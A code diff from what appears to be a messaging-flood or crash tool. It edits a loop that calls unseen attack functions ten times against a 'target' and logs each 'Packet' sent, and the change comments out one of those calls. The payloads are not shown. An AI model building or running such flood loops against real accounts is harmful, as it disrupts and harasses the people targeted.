@@ -841,7 +841,7 @@ async function BH3(sock, target) {
 async function sikat(sock, target) {
     for (let i = 0; i < 10; i++) {
         //await AB1(sock, target, true)
-        await AB2(sock, target, true)
+        //await AB2(sock, target, true)
         await F(sock, target)
         console.log(`${i} sikat Packet To ${target}`)
     }
